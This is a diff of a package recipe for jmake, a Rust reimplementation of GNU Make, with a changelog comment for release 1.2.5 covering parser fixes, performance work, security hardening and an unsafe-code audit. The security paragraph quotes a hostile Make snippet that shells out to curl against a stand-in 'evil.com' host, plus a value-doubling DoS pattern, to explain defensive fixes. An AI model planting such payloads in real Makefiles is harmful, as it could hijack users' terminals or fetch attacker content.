@@ -1,8 +1,75 @@
 [package]
 name = "jmake"
-version = "1.2.3"
+version = "1.2.5"
 license = "MIT"
 description = "Clean-room drop-in replacement for GNU Make, written in Rust"
+# 1.2.5: Valkey/jemalloc unblock + perf + security + safety audit.
+#
+# Static pattern rule recipe-loss (Valkey/jemalloc blocker): GNU Make
+# allows declaring a static pattern rule's prerequisite-pattern in one
+# statement and its recipe in another — jemalloc's Makefile does this
+# (`$(C_JET_OBJS): $(objroot)src/%.jet.$(O): $(srcroot)src/%.c` then
+# later `$(C_JET_OBJS): %.$(O):\n\trecipe`). 1.2.4 lost the prereq when
+# they were split, leaving `$<` empty and producing `cc: error: no input
+# files` on every .jet.o build. Fix: when a target doesn't match the
+# target-pattern, emit it as an empty-prereq rule (preserving the
+# recipe binding) with a warning, instead of silently dropping it.
+# End-to-end validated 2026-05-11: jemalloc 5.3.0 + Valkey 9.0.4 build
+# clean on a Raspberry Pi 5 and the server starts + PING/SET/GET works.
+#
+# Tab-indented variable assignment inside ifeq: ifeq/else/endif left
+# the parser in `in_recipe=true` state if a rule had been opened, so
+# `\tFINAL_LIBS += -ldl` inside a conditional block got queued as a
+# recipe line of the preceding rule. Fix in src/parser/mod.rs: detect
+# Make-op assignments (+=, :=, ::=, :::=, ?=, !=) on tab-indented
+# lines and classify them as variable assignments regardless of
+# in_recipe. Plain `=` is intentionally excluded to preserve correct
+# parsing of .ONESHELL recipes containing `@X=val` and env-prefix
+# commands like `VAR=val cmd`.
+#
+# Built-in function perf (4.5–6× across 11 functions): replaced
+# `Vec<String>` + `.join(" ")` with direct String accumulation in
+# addsuffix, addprefix, join, patsubst, filter, filter-out, strip,
+# dir, notdir, suffix, basename, realpath, abspath, sort, and the
+# substitution-reference expander. $(foreach) reuses its auto_vars
+# HashMap across iterations instead of cloning per word. BUILTIN_VARS
+# linear scan replaced with OnceLock<HashSet> for O(1) lookup.
+# find_pattern_rule_inner no longer allocates a Vec<&Rule> per
+# uncached call.
+#
+# Security hardening: 256 MiB cap on expanded-value size (HIGH —
+# defeats S_n := $(S_{n-1})$(S_{n-1}) assignment-doubling and
+# $(foreach) explosion DoS). ANSI escape sanitization for $(info) /
+# $(warning) / $(error) output when stdout is a TTY (MEDIUM —
+# prevents terminal hijack via $(warning $(shell curl evil.com))).
+# Pass-through when piped so CI logs unaffected.
+#
+# Safety audit: all 11 unsafe sites (9 unsafe blocks + 2 unsafe impl
+# Sync/Send) re-documented with canonical per-bullet SAFETY blocks.
+# Setup-time bounds checks (set_temp_stdin_path, set_term_message)
+# promoted from debug_assert! to assert! so release builds can't drop
+# the guard. Two $(eval) raw pointer casts flagged with a Kani
+# harness opportunity and a "needs RefCell<MakeDatabase>" TODO gated
+# for 1.3.0. See UNSAFE_AUDIT.md in the repo.
+#
+# Compat: 132 passing tests adopted from the GNU Make 4.4.1 upstream
+# test suite as ongoing regression coverage; 308 known failures
+# triaged into 9 categories live in tests/upstream_441_GAPS.md.
+# Top backlog: MAKEFLAGS letter-flag propagation in recursive make
+# (96), chained implicit rule search (60+).
+#
+# Known cosmetic issues (queued for 1.2.6) — these produce stderr
+# noise but do NOT prevent successful builds. Verified on real
+# Valkey: build completes, binaries link, server runs:
+#   - Valkey's specific QUIET_CC pattern (where $(CC) is wrapped by
+#     a $(QUIET_CC) variable that begins with @printf and includes
+#     color escape sequences) leaks the @ through some code path
+#     that's not reproducible with simpler 3-line reproducers.
+#   - Valkey's deep ifeq nesting (FINAL_LIBS+= inside ifeq-inside-
+#     ifeq with mixed tab/space indentation) leaks the FINAL_LIBS+=
+#     text as a shell command after the link step. Same: build
+#     succeeds despite the stderr.
+#
 # 1.2.3: multi-word SHELL re-tokenization bug — when SHELL contained
 # whitespace (e.g. `SHELL = /bin/sh -e`, which Python's ./configure
 # writes by default), jmake 1.2.2 composed the invocation as a single
@@ -191,8 +258,8 @@ description = "Clean-room drop-in replacement for GNU Make, written in Rust"
 # Forgejo URL is Tailscale-only, so we point at a GitHub-hosted source
 # mirror that CI can reach without VPN. The mirror tarball is generated
 # from the same v1.1.6 tag at castle.great-morpho.ts.net:3000.
-url = "https://github.com/stormj-UH/jonerix/releases/download/source-jmake-v1.2.3/jmake-v1.2.3.tar.gz"
-sha256 = "e6a22124a194fd0951fdc2eb908a6461c18fc1b4263045daecc9f1f3d3fb3045"
+url = "https://github.com/stormj-UH/jonerix/releases/download/source-jmake-v1.2.5/jmake-v1.2.5.tar.gz"
+sha256 = "9b8fb2547beb6459e1ba7036d83b68ebc362fe399af7a243bdb4a41b261260c0"
 
 [build]
 system = "custom"
